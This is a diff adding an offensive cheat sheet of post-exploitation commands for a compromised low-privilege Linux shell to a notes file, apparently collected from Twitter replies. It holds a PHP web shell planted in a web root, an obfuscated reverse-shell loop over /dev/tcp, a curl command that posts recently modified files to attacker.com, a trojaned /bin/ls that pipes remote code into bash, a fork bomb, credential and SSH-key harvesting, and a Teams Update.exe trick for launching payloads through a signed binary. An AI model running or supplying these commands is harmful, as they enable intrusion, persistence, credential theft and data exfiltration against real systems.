@@ -1,4 +1,54 @@
 *****************************
+# from twitter @JaneScott_ ask first cmds to run
+# given a low priv shell on linux, responses
+Cd /tmp && wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh … then chmod +× LinEnum. sh lastly ./LinEnum.sh
+
+w;uname -a;lsb_release -a
+
+history
+find / -perm -4000 -exec ls -l {} \;
+
+$ find /var/www -perm -o+w
+$ echo "<?php passthru($_GET['cmd']); ?>" > /var/www/<dir output from command 1>/not-a-shell.php
+
+printenv
+ifconfig -a
+iptable -L
+cat /etc/apache2/site-enabled/*
+netstat -punta
+ps aux
+crontab -L
+cat /etc/cron*
+grep -iR -C 5 "password" /home/*
+cat /home/*/.bash_history
+cat /home/*/.ssh/*
+
+https://github.com/diego-treitos/linux-smart-enumeration
+
+# :(){ :|: & };:
+
+P=( $(ps -u "$USER"|awk '{print $4}'|sed -e '/..../!d') );cS="${P["$[RANDOM % ${#P[@]}]"]}";cp /bin/sleep /tmp/$cS;cB="${P["$[RANDOM % ${#P[@]}]"]}";cp /bin/bash /tmp/$cB;while true;do /tmp/"$cS" 9 && /tmp/"$cB" -i >& /dev/tcp/0x0A2A0001/1 0>&1;done
+
+# start exfil of recently modified files:
+find / -readable -size -100M -mtime -10 -type f -iregex '.*\.\(pdf\|txt\|kdbx\|conf\|sh\|src\|tar\|pub\)$' -exec /usr/bin/curl -X POST -F "data=@{}" http://attacker.com/exfil.php  \;
+
+find / -perm -u=s -type f 2>/dev/null
+
+1. cp /bin/ls /bin/LS
+2. echo "#!/bin/bash\n curl http://abx.ir/evil  | bash\n LS $@" > /bin/ls
+
+unix-privesc-check
+
+Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\
+
+Then
+
+%userprofile%\AppData\Local\Microsoft\Teams\Update.exe --processStart payload.exe --process-start-args "whatever args"
+
+Trusted signed binary will run the payload for you 😊
+
+
+*****************************
 turn history on or off
 
 set +o history
